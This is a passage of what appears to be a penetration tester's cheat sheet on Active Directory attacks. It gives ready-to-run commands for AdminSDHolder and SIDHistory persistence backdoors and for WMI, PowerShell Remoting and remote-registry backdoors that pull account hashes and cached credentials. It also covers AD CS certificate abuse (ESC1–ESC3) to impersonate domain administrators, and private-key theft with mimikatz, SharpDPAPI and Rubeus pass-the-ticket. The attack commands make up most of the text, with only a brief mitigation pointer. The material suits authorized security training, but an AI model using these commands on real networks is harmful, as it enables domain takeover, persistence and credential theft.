<li>If the permissions on any of the protected accounts and groups do not match the permissions on the <em>AdminSDHolder</em> object, <em>SDProp</em> resets the permissions on the protected accounts and groups to match those configured for the domain's <em>AdminSDHolder</em> object.</li>
</ul>
<p>With Domain Admin privileges (Full Control/Write permissions) on the <em>AdminSDHolder</em> object, it can be used as a backdoor/persistence mechanism. This can be done by adding higher privileges permissions, such as <em>Full Control</em>, to a user,  modifying the <em>AdminSDHolder</em> object. These changes will be applied the moment the <em>SDProp</em> process runs.</p>
<p>Add <em>Full Control</em> permissions for a user to the AdminSDHolder object (as Domain Admin):</p>
<div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
<span class="nb">Add-ObjectAcl</span> <span class="n">-TargetADSprefix</span> <span class="s1">'CN=AdminSDHolder,CN=System'</span>  <span class="n">-PrincipalSamAccountName</span> <span class="p">&lt;</span><span class="n">controlled</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-Rights</span> <span class="n">All</span> <span class="n">-Verbose</span>

<span class="c"># AD Module</span>
<span class="nb">Set-ADACL</span> <span class="n">-DistinguishedName</span> <span class="s1">'&lt;CN=AdminSDHolder,CN=System,DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'</span> <span class="n">-Principal</span> <span class="p">&lt;</span><span class="n">controlled</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Other interesting permissions are (<code>-Rights</code> option in <code>PowerView</code>  or <code>-GUIDRight</code> for <code>AD Module</code>):</p>
<ul>
<li><code>ResetPassword</code></li>
<li><code>WriteMembers</code></li>
</ul>
<p>Run SDProp manually:</p>
<div class="highlight"><pre><span></span><code><span class="p">.</span> <span class="p">.\</span><span class="nb">Invoke-SDPropagator</span><span class="p">.</span><span class="n">ps1</span>

<span class="nb">Invoke-SDPropagator</span> <span class="n">-timeoutMinutes</span> <span class="n">1</span> <span class="n">-showProgress</span> <span class="n">-Verbose</span>

<span class="c"># For machines pre-Windows Server 2008</span>
<span class="nb">Invoke-SDPropagator</span> <span class="n">-taskname</span> <span class="n">FixUpInheritance</span> <span class="n">-timeoutMinutes</span> <span class="n">1</span> <span class="n">-showProgress</span> <span class="n">-Verbose</span>
</code></pre></div>
<h4 id="mitigations_10">Mitigations</h4>
<p>The tool <a href="https://github.com/canix1/ADACLScanner">AD ACL Scanner</a> allow to create report of ACLs useful to harden weak ACLs or detect mischievous ones.</p>
<h3 id="sidhistory_1">SIDHistory</h3>
<p>Patch <code>ntds.dis</code> file to edit the <code>SIDHistory</code> property of an account using <a href="https://github.com/MichaelGrafnetter/DSInternals">DSInternals</a> (Domain Admin privileges required):</p>
<div class="highlight"><pre><span></span><code><span class="nb">Stop-Service</span> <span class="n">-Name</span> <span class="n">ntds</span> <span class="n">-force</span> 
<span class="nb">Add-ADDBSidHistory</span> <span class="n">-SamAccountName</span> <span class="p">&lt;</span><span class="n">account</span><span class="p">&gt;</span> <span class="n">-SidHistory</span> <span class="p">&lt;</span><span class="n">SID</span> <span class="n">to</span> <span class="n">add</span> <span class="n">to</span> <span class="n">the</span> <span class="n">SIDHistory</span><span class="p">&gt;</span>  <span class="n">-DatabasePath</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">NTDS</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> 
<span class="nb">Start-Service</span> <span class="n">-Name</span> <span class="n">ntds</span>  
</code></pre></div>
<p><strong>Note</strong>: it's mandatory to stop the NTDS service before the patch (ntdis.dit will be locked) and restart it after the patch in order to apply changes.</p>
<h3 id="security-descriptors">Security Descriptors</h3>
<p>Having local administrative privileges on a machine, it's possible to modify security descriptors and the information contained within such as:</p>
<ul>
<li>Owner</li>
<li>Primary group</li>
<li>DACL</li>
<li>SACL</li>
</ul>
<p>for remote access methods such as:</p>
<ul>
<li>WMI</li>
<li>PowerShell Remoting</li>
<li>etc</li>
</ul>
<p>in order to grant access also to non-admin users.</p>
<p><strong>Security Descriptor Definition Language</strong> is used to describe a security descriptor, using <strong>Access Control Entries (ACE)</strong> strings for DACL and SACL:</p>
<ul>
<li><code>ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid</code></li>
</ul>
<p>Following the reference for each field: <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings">https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings</a></p>
<h4 id="security-descriptors-wmi">Security Descriptors - WMI</h4>
<p>In order to permit a non administrative user to use WMI from remote, it's necessary to grant this user:</p>
<ul>
<li>the privilege to connect to the DCOM endpoint.</li>
<li>to connect to the target namespace, generally <code>root\cimv2</code></li>
</ul>
<p>Via GUI:</p>
<div class="highlight"><pre><span></span><code>#<span class="w"> </span><span class="nv">Setup</span><span class="w"> </span><span class="nv">COM</span><span class="w"> </span><span class="nv">privileges</span>

<span class="mi">1</span>.<span class="w"> </span><span class="nv">From</span><span class="w"> </span><span class="s2">"Component Services"</span>
<span class="mi">2</span>.<span class="w"> </span><span class="nv">Edit</span><span class="w"> </span><span class="s2">"Component Services &gt; Computers &gt; My Computer"</span><span class="w"> </span><span class="nv">properties</span>
<span class="mi">3</span>.<span class="w"> </span><span class="nv">From</span><span class="w"> </span><span class="s2">"COM Security"</span>,<span class="w"> </span><span class="nv">add</span><span class="w"> </span><span class="nv">full</span><span class="w"> </span><span class="nv">control</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">target</span><span class="w"> </span><span class="nv">user</span><span class="w"> </span><span class="nv">on</span><span class="w"> </span><span class="s2">"Access Permissions"</span><span class="w"> </span><span class="nv">and</span><span class="w"> </span><span class="s2">"Lanch and Activation Permissions"</span><span class="w"> </span><span class="nv">by</span><span class="w"> </span><span class="nv">clicking</span><span class="w"> </span><span class="nv">on</span><span class="w"> </span><span class="s2">"Edit Limits..."</span>

#<span class="w"> </span><span class="nv">Setup</span><span class="w"> </span><span class="nv">WMI</span><span class="err">'s namespaces privileges</span>
<span class="err">1. From "Computer Management"</span>
<span class="err">2. Edit "Services and Application &gt; WMI Control" properties</span>
<span class="err">3. From "Security" tab, select the target namespace and add full control for the target user</span>
<span class="err">4. Click on "Advanced" and select the added user</span>
<span class="err">5. Click on "Edit" and modify "Applies to" value from "This namespace only" to "This namespace and subnamespaces"</span>
</code></pre></div>
<p>Via PowerShell using <a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1">Set-RemoteWMI.ps1</a>:</p>
<div class="highlight"><pre><span></span><code><span class="c"># On local machine</span>
<span class="nb">Set-RemoteWMI</span> <span class="n">-UserName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-Verbose</span>

<span class="c"># On remote machine without explicit credentials</span>
<span class="nb">Set-RemoteWMI</span> <span class="n">-UserName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-namespace</span> <span class="s1">'root\cimv2'</span> <span class="n">-Verbose</span>

<span class="c"># On remote machine with explicit credentials - only root\cimv2 and nested namespaces</span>
<span class="nb">Set-RemoteWMI</span> <span class="n">-UserName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="n">Administrator</span> <span class="n">-namespace</span> <span class="s1">'root\cimv2'</span> <span class="n">-Verbose</span>

<span class="c"># On remote machine - remove permissions</span>
<span class="nb">Set-RemoteWMI</span> <span class="n">-UserName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-namespace</span> <span class="s1">'root\cimv2'</span> <span class="n">-Remove</span> <span class="n">-Verbose</span>
</code></pre></div>
<h4 id="security-descriptors-powershell-remoting">Security Descriptors - PowerShell Remoting</h4>
<p>Enable PowerShell Remoting for a non-admin user using <a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1">Set-RemotePSRemoting.ps1</a>:</p>
<div class="highlight"><pre><span></span><code><span class="c"># On local machine</span>
<span class="nb">Set-RemotePSRemoting</span> <span class="n">-UserName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-Verbose</span>

<span class="c"># On remote machine without credentials:</span>
<span class="nb">Set-RemotePSRemoting</span> <span class="n">-UserName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-Verbose</span>

<span class="c"># On remote machine, remove the permissions</span>
<span class="nb">Set-RemotePSRemoting</span> <span class="n">-UserName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-Remove</span>
</code></pre></div>
<h4 id="security-descriptors-remote-registry">Security Descriptors - Remote Registry</h4>
<p>Edit remote machine registry in order to create a backdoor that allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials using <a href="https://github.com/HarmJ0y/DAMP/tree/master">DAMP</a>:</p>
<div class="highlight"><pre><span></span><code><span class="c"># Create backdoor - run with administrative privileges on target computer</span>
<span class="nb">Add-RemoteRegBackdoor</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-Trustee</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-Verbose</span>

<span class="c"># Retrieve machine account hash</span>
<span class="nb">Get-RemoteMachineAccountHash</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-Verbose</span>

<span class="c"># Retrieve local account hash</span>
<span class="nb">Get-RemoteLocalAccountHash</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-Verbose</span>

<span class="c"># Retrieve domain cached credentials</span>
<span class="nb">Get-RemoteCachedCredential</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">target</span> <span class="n">computer</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
</code></pre></div>
<p>Note: may be necessary to rename the <code>$IV</code> variable to another name!</p>
<h3 id="active-directory-certificate-services-ad-cs_1">Active Directory Certificate Services (AD CS)</h3>
<p><strong>Active Directory Certificate Services (AD CS)</strong> is a <strong>Microsoft Windows Server role</strong> that provides customizable services for creating and managing public key infrastructure (PKI) and digital certificates. AD CS enables organizations to secure data and communications by issuing, renewing, and revoking certificates <strong>used for identity authentication</strong>, secure communication, and data encryption by acting as a Certificate Authority to prove and delegate trust.</p>
<ul>
<li>AD CS is a privileged function and therefore generally runs only on selected domain controllers.</li>
<li>Administrators of AD CS can create <strong>Certificates Templates</strong> that allow any user with the relevant permissions to request a certificate. <ul>
<li>These templates have parameters that say which user can request the certificate and what is required. </li>
</ul>
</li>
</ul>
<p>A template with the following parameter combination can be abused by an attacker to potentially perform privilege escalation:</p>
<ul>
<li><strong>Client Authentication</strong> - The certificate can be used for Client Authentication.</li>
<li><strong>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</strong> - The certificate template allows to specify the Subject Alternative Name (SAN).</li>
<li><strong>CTPRIVATEKEY_FLAG_EXPORTABLE_KEY</strong> - The certificate will be exportable with the private key.</li>
<li><strong>Certificate Permissions</strong> - Defines who can use the certificate template.</li>
</ul>
<p>Certificate templates are AD objects with an object class of <code>pKICertificateTemplate</code>.</p>
<p>Attacks scenarios:</p>
<ul>
<li><strong>Certificate Theft</strong>: export a certificate or a private key to be used for next scenarios.</li>
<li><strong>Persistence</strong>: abuse a misconfigured certificate to authenticate as the specified user.</li>
<li><strong>Escalation</strong>: using the private key from a CA, forge a certificate and escalate privileges.</li>
</ul>
<p>References:</p>
<ul>
<li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">Certified Pre-Owned</a></li>
<li><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">Certified Pre-Owned Whitepaper</a></li>
</ul>
<p>Enumerate if ADCS is active on a DC:</p>
<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;DC&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-M<span class="w"> </span>adcs
</code></pre></div>
<p>Enumerate CAs from a domain joined machine:</p>
<div class="highlight"><pre><span></span><code>certutil.exe<span class="w"> </span>-TCAInfo
</code></pre></div>
<p>Enumerate certificates templates:</p>
<div class="highlight"><pre><span></span><code>certutil<span class="w"> </span>-Template<span class="w"> </span>-v<span class="w"> </span>&gt;<span class="w"> </span>template.txt
certutil<span class="w"> </span>-v<span class="w"> </span>-dstemplate<span class="w"> </span>&gt;<span class="w"> </span>template.txt
</code></pre></div>
<p>Enumerate CA and Certificate Templates remotely with <a href="https://github.com/ly4k/Certipy">Certipy-AD</a>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>find<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;@domain&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-json<span class="w"> </span><span class="o">[</span>-old-bloodhound<span class="o">]</span>
</code></pre></div>
<p><strong>Note</strong>: <code>-old-bloodhound</code> option generates files to be ingested by BloodHound.</p>
<p>Enumerate vulnerable certificates templates with <a href="https://github.com/GhostPack/Certify">Certify</a>:</p>
<div class="highlight"><pre><span></span><code>Certify.exe<span class="w"> </span>find<span class="w"> </span>/vulnerable
</code></pre></div>
<h4 id="misconfigured-certificate-templates-esc1">Misconfigured Certificate Templates &mdash; ESC1</h4>
<p><strong>Requirements</strong>:</p>
<ul>
<li><strong>REQ1</strong>: The Enterprise CA grants low-privileged users enrollment rights</li>
<li><strong>REQ2</strong>: Manager approval is disabled</li>
<li><strong>REQ3</strong>: No authorized signatures are required.</li>
<li><strong>REQ4</strong>: Domain Users (or other low privileged users/groups) have the <strong>Enrollment</strong> ACE in a target certificate template object's DACL.<ul>
<li><code>In the Certificate Templates Console MMC snap-in, permissions are set under the template&rsquo;s properties &rarr; Security</code></li>
</ul>
</li>
<li><strong>REQ5</strong>: The target certificate template defines <strong>EKUs</strong> (Extended Key Usage) that enable authentication (Client Authentication, Smart Card Logon, etc.) <ul>
<li>The property <code>pKIExtendedKeyUsage</code> on the certificate template object contains this information.</li>
<li><code>In the Certificate Templates Console MMC snap-in, EKUs are set under the template&rsquo;s properties &rarr; Extensions &rarr; Application Policies</code></li>
</ul>
</li>
<li><strong>REQ6</strong>: The certificate template allows requesters to specify a subjectAltName (SAN) in the CSR. <ul>
<li>This is possible if the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag is set into the <code>mspki-certificate-name-flag</code> bitmask.</li>
<li><code>In the Certificate Templates Console MMC snap-in, this value is set under a template&rsquo;s properties &rarr; Subject Name &rarr; Supply in request</code></li>
</ul>
</li>
</ul>
<p><strong>The attack</strong>: enumerate vulnerable certificate templates &rarr; request a certificate with this template specifying an high privilege user as the altname &rarr; use the certificate to request a TGT</p>
<p>Manually enumerate potential <strong>ESC1</strong> vulnerable certificate templates:</p>
<div class="highlight"><pre><span></span><code><span class="p">(</span>&amp;<span class="p">(</span><span class="nv">objectclass</span><span class="o">=</span><span class="nv">pkicertificatetemplate</span><span class="p">)(</span><span class="o">!</span><span class="p">(</span><span class="nv">mspki</span><span class="o">-</span><span class="nv">enrollment</span><span class="o">-</span>
<span class="nv">flag</span><span class="o">:</span><span class="mf">1.2</span><span class="o">.</span><span class="mf">840.113556</span><span class="o">.</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">804</span><span class="o">:=</span><span class="mi">2</span><span class="p">))(</span><span class="o">|</span><span class="p">(</span><span class="nv">mspki</span><span class="o">-</span><span class="nv">ra</span><span class="o">-</span><span class="nv">signature</span><span class="o">=</span><span class="mi">0</span><span class="p">)(</span><span class="o">!</span><span class="p">(</span><span class="nv">mspki</span><span class="o">-</span><span class="nv">ra</span><span class="o">-</span>
<span class="nv">signature</span><span class="o">=*</span><span class="p">)))(</span><span class="o">|</span><span class="p">(</span><span class="nv">pkiextendedkeyusage</span><span class="o">=</span><span class="mf">1.3</span><span class="o">.</span><span class="mf">6.1</span><span class="o">.</span><span class="mf">4.1</span><span class="o">.</span><span class="mf">311.20</span><span class="o">.</span><span class="mf">2.2</span><span class="p">)(</span><span class="nv">pkiextend</span>
<span class="nv">edkeyusage</span><span class="o">=</span><span class="mf">1.3</span><span class="o">.</span><span class="mf">6.1</span><span class="o">.</span><span class="mf">5.5</span><span class="o">.</span><span class="mf">7.3</span><span class="o">.</span><span class="mi">2</span><span class="p">)(</span><span class="nv">pkiextendedkeyusage</span><span class="o">=</span><span class="mf">1.3</span><span class="o">.</span><span class="mf">6.1</span><span class="o">.</span><span class="mf">5.2</span><span class="o">.</span><span class="mf">3.4</span><span class="p">)</span>
<span class="p">(</span><span class="nv">pkiextendedkeyusage</span><span class="o">=</span><span class="mf">2.5</span><span class="o">.</span><span class="mf">29.37</span><span class="o">.</span><span class="mi">0</span><span class="p">)(</span><span class="o">!</span><span class="p">(</span><span class="nv">pkiextendedkeyusage</span><span class="o">=*</span><span class="p">)))(</span><span class="nv">mspki</span><span class="o">-</span>
<span class="nv">certificate</span><span class="o">-</span><span class="nv">name</span><span class="o">-</span><span class="nv">flag</span><span class="o">:</span><span class="mf">1.2</span><span class="o">.</span><span class="mf">840.113556</span><span class="o">.</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">804</span><span class="o">:=</span><span class="mi">1</span><span class="p">))</span>
</code></pre></div>
<p>Check if user has the <code>Enrollment</code> ACE for the target certificate template DACL from gui (<code>mmc.exe</code>)(REQ4):</p>
<div class="highlight"><pre><span></span><code>In the Certificate Templates Console MMC snap-in, permissions are set under the template&rsquo;s properties &rarr; Security
</code></pre></div>
<p>Check certificate template EKUs from gui (<code>mmc.exe</code>)(REQ5):</p>
<div class="highlight"><pre><span></span><code>In the Certificate Templates Console MMC snap-in, EKUs are set under the template&rsquo;s properties &rarr; Extensions &rarr; Application Policies
</code></pre></div>
<p>Check if <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> is set from gui (<code>mmc.exe</code>) (REQ6):</p>
<div class="highlight"><pre><span></span><code>In the Certificate Templates Console MMC snap-in, this value is set under a template&rsquo;s properties &rarr; Subject Name &rarr; Supply in request
</code></pre></div>
<p><strong><em>Request certificate using certipy-ad</em></strong></p>
<p>Request a certificate with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-ca<span class="w"> </span>&lt;ca<span class="w"> </span>name&gt;<span class="w"> </span>-target<span class="w"> </span>&lt;ca<span class="w"> </span>server&gt;<span class="w"> </span>-template<span class="w"> </span>&lt;vulnerable<span class="w"> </span>template&gt;<span class="w"> </span>-upn<span class="w"> </span>&lt;user<span class="w"> </span>to<span class="w"> </span>impersonate&gt;@&lt;domain&gt;
</code></pre></div>
<p>Request TGT and get hash for impersonate user:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>&lt;.pfx<span class="w"> </span>certificate<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>impersonate<span class="w"> </span>user&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;
</code></pre></div>
<p><strong><em>Request certificate using Certify</em></strong></p>
<p>Request a certificate with <code>Certify</code>:</p>
<div class="highlight"><pre><span></span><code>Certify.exe<span class="w"> </span>request<span class="w"> </span>/ca:&lt;domain&gt;<span class="se">\&lt;</span>CA&gt;<span class="w"> </span>/template:&lt;Template<span class="w"> </span>name&gt;<span class="w"> </span>/altname:&lt;user<span class="w"> </span>to<span class="w"> </span>impersonate&gt;
</code></pre></div>
<p><strong><em>Request certificate using GUI</em></strong></p>
<p>Request a certificate from <code>certmgr.msc</code> (GUI session):</p>
<ol>
<li>Right Click on <strong>Personal</strong> and select <strong>All Tasks</strong>-&gt;<strong>Request New Certificate...</strong></li>
<li>Click <strong>Next</strong> twice to select the AD enrollment policy.</li>
<li>Select the template and click on the <strong>More Information</strong> warning.</li>
<li>Change the <strong>Subject name Type</strong> option to <strong>Common Name</strong> and provide any value, since it does not matter, and click <strong>Add</strong>.</li>
<li>Change the <strong>Alternative name Type</strong> option to <strong>User principal name</strong>.</li>
<li>Supply the UPN of the user to impersonate (eg. a Domain Administrator Account).</li>
<li>Click <strong>Add</strong>.</li>
</ol>
<p>Export the private key (.pfx)* from <code>certmgr.msc</code> (GUI session):</p>
<ol>
<li>Right Click on the certificate and select <strong>All Tasks</strong>-&gt;<strong>Export...</strong></li>
</ol>
<p>*<strong>Note</strong>: the private key must be exportable!  If the private key is non-exportable, the Microsoft CryptoAPI (CAPI) or the Cryptography API: Next Generation (CNG) modules will not allow extraction of non-exportable certificates. </p>
<p><strong><em>Request certificate using Mimikatz</em></strong></p>
<p>Export certificate and private key using DPAPI using <a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a> and <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Decrypt the masterkey with mimikatz - mimikatz must run in the target user&rsquo;s security context</span>
dpapi::masterkey<span class="w"> </span>/in:&lt;path<span class="w"> </span>to<span class="w"> </span>master<span class="w"> </span>key&gt;<span class="w"> </span>/rpc

<span class="c1"># Or, Decrypt the masterkey with mimikatz - user password must be known</span>
dpapi::masterkey<span class="w"> </span>/in:&lt;path<span class="w"> </span>to<span class="w"> </span>master<span class="w"> </span>key&gt;<span class="w"> </span>/sid:&lt;account<span class="w"> </span>side&gt;<span class="w"> </span>/password:&lt;password&gt;

<span class="c1"># Or , descrupt the master key with SharpDPAPI - user password must be known</span>
SharpDPAPI.exe<span class="w"> </span>masterkeys<span class="w"> </span>/password:&lt;password&gt;

<span class="c1"># Export Cert and private key with SharpDPAPI</span>
SharpDPAPI.exe<span class="w"> </span>certificates<span class="w"> </span>/mkfile:&lt;path<span class="w"> </span>to<span class="w"> </span>master<span class="w"> </span>key<span class="w"> </span>file&gt;
</code></pre></div>
<p><strong>Note</strong>: The masterkeys are stored at <code>C:\Users &lt;UserName&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;MasterKey&gt;</code></p>
<p>Export certificate and private key with <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># If private key/certificate it's not exportable</span>
crypto::capi
crypto::cng

<span class="c1"># Current User</span>
crypto::certificates<span class="w"> </span>/export

<span class="c1"># Current machine</span>
crypto::certificates<span class="w"> </span>/systemstore:local_machine<span class="w"> </span>/export
</code></pre></div>
<p><strong>Note</strong>:
- <code>crypto::capi</code> patches CAPI in the current process
- <code>crypto::cng</code> requires patching lsass.exe&rsquo;s memory</p>
<p><strong><em>Pass-the-ticket attack with a certificate</em></strong></p>
<p>Use the certificate to request a TGT with  <code>Rubeus</code>:</p>
<div class="highlight"><pre><span></span><code>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:&lt;user<span class="w"> </span>to<span class="w"> </span>impersonate&gt;<span class="w"> </span>/certificate:&lt;path<span class="w"> </span>to<span class="w"> </span>.pfx<span class="w"> </span>certificate&gt;<span class="w"> </span>/password:&lt;pfx<span class="w"> </span>password&gt;

Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:&lt;user<span class="w"> </span>to<span class="w"> </span>impersonate&gt;<span class="w"> </span>/enctype:aes256<span class="w"> </span>/certificate:&lt;path<span class="w"> </span>to<span class="w"> </span>certificate&gt;<span class="w"> </span>/password:&lt;certificate<span class="w"> </span>file<span class="w"> </span>password&gt;<span class="w"> </span>/domain:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>/dc:&lt;IP<span class="w"> </span>of<span class="w"> </span>domain<span class="w"> </span>controller&gt;<span class="w"> </span>/ptt
</code></pre></div>
<h4 id="misconfigured-certificate-templates-esc2">Misconfigured Certificate Templates &mdash; ESC2</h4>
<p><strong>ESC2</strong> is a variation of <strong>ESC1</strong>.</p>
<p><strong>Requirements</strong>: <strong>REQ1-4</strong> are same as <strong>ESC1</strong></p>
<ul>
<li><strong>REQ5</strong>: The certificate template defines the <code>Any Purpose</code> EKU or <strong>no EKUs</strong>.</li>
<li>[Optional] <strong>REQ6</strong>: same as <strong>ESC1</strong>. If satisfied, then <strong>ESC2 = ESC1</strong>.</li>
</ul>
<p><strong>The attack</strong>: When <strong>REQ6</strong> is not satisfied, i.e. it's not possible to specify arbitrary altnames, certificate template with<code>Any Purpose</code> EKU or <strong>no EKUs</strong> can still be used to authenticate to AD as the user who requested them.</p>
<p>Moreover, when there are <strong>no EKUs</strong>, the certificate can also be used as a <strong>subordinate CA certificate</strong> to sign new certificates; an attacker could specify arbitrary EKUs or fields in the new certificates.</p>
<ul>
<li>To use these new certificate <strong>for domain authentication</strong>, the subordinate CA should be trusted by the <code>NTAuthCertificates</code> object. <strong>By default it wouldn't be trusted</strong>.</li>
<li>Still an attacker could abuse these new certificates for other scenarios such as code signing, server authentication, etc.</li>
</ul>
<p>Manually enumerate potential <strong>ESC2</strong> vulnerable certificate templates:</p>
<div class="highlight"><pre><span></span><code><span class="p">(</span>&amp;<span class="p">(</span><span class="nv">objectclass</span><span class="o">=</span><span class="nv">pkicertificatetemplate</span><span class="p">)(</span><span class="o">!</span><span class="p">(</span><span class="nv">mspki</span><span class="o">-</span><span class="nv">enrollment</span><span class="o">-</span>
<span class="nv">flag</span><span class="o">:</span><span class="mf">1.2</span><span class="o">.</span><span class="mf">840.113556</span><span class="o">.</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">804</span><span class="o">:=</span><span class="mi">2</span><span class="p">))(</span><span class="o">|</span><span class="p">(</span><span class="nv">mspki</span><span class="o">-</span><span class="nv">ra</span><span class="o">-</span><span class="nv">signature</span><span class="o">=</span><span class="mi">0</span><span class="p">)(</span><span class="o">!</span><span class="p">(</span><span class="nv">mspki</span><span class="o">-</span><span class="nv">ra</span><span class="o">-</span>
<span class="nv">signature</span><span class="o">=*</span><span class="p">)))(</span><span class="o">|</span><span class="p">(</span><span class="nv">pkiextendedkeyusage</span><span class="o">=</span><span class="mf">2.5</span><span class="o">.</span><span class="mf">29.37</span><span class="o">.</span><span class="mi">0</span><span class="p">)(</span><span class="o">!</span><span class="p">(</span><span class="nv">pkiextendedkeyusag</span>
<span class="nv">e</span><span class="o">=*</span><span class="p">))))</span>
</code></pre></div>
<h4 id="misconfigured-enrollment-agent-templates-esc3">Misconfigured Enrollment Agent Templates - ESC3</h4>
<p>The <code>Certificate Request Agent</code> EKU (OID 1.3.6.1.4.1.311.20.2.1), known as <strong>Enrollment Agent</strong> allows a principal to enroll for a certificate on behalf of another user. This can be abused to escalate privileges.</p>
<p><strong>Requirements</strong>: in order to abuse the <strong>Enrollment Agent</strong>, two certificate templates are required to match respectively <strong>CONDITION1</strong> and <strong>CONDITION2</strong> specified below.</p>
<ul>
<li><strong>CONDITION1</strong>: A template allows a low-privileged user to enroll in an enrollment agent certificate<ul>
<li><strong>REQ1-4</strong>: same as for <strong>ESC1</strong>.</li>
<li><strong>REQ5</strong>: The certificate template has the <strong>Certificate Request Agent</strong> EKU.</li>
</ul>
</li>
<li><strong>CONDITION2</strong>: another template permits a low privileged user to use the enrollment agent certificate to request a certificate on behalf of another user, and the template defines an EKU that allows for <strong>domain authentication</strong>.<ul>
<li><strong>REQ1-2</strong>: same as for <strong>ESC1</strong>.</li>
<li><strong>REQ3</strong>: the template schema version is <strong>1</strong> or is <strong>greater than 2</strong> .</li>
<li><strong>REQ4</strong>: the <strong>Application Policy</strong> for this template requires the <code>Certificate Request Agent</code> EKU </li>
<li><strong>REQ5</strong>: same as for ESC1 -  has EKUs that enable domain authentication.</li>
<li><strong>REQ6</strong>: Enrollment agent restrictions on the CA is set to <code>Do not restrict enrollment agents</code> or to <code>Restrict enrollment agent</code> but with the default configuration (allows <em>Everyone</em>).<ul>
<li><code>certsrc.msc snap-in &rarr; right clicking on the &rarr; clicking Properties &rarr; navigating to the &ldquo;Enrollment Agents&rdquo; tab</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>The attack</strong>: request an enrollment agent certificate (CONDITION1) &rarr; use the enrollment agent certificate to issue a certificate request on behalf of another to a template that allow for domain authentication (CONDITION2) &rarr; use the resulting certificate to request a TGT.</p>
<p><strong>Note</strong>: a certificate vulnerable to <strong>ESC2</strong> is also suitable for <strong>CONDITION1</strong> if it's enabled as enrollment agent!</p>
<p>Check for enrollment agent restrictions on the CA from GUI (<strong>CONDITION2</strong> - <strong>REQ6</strong>):</p>
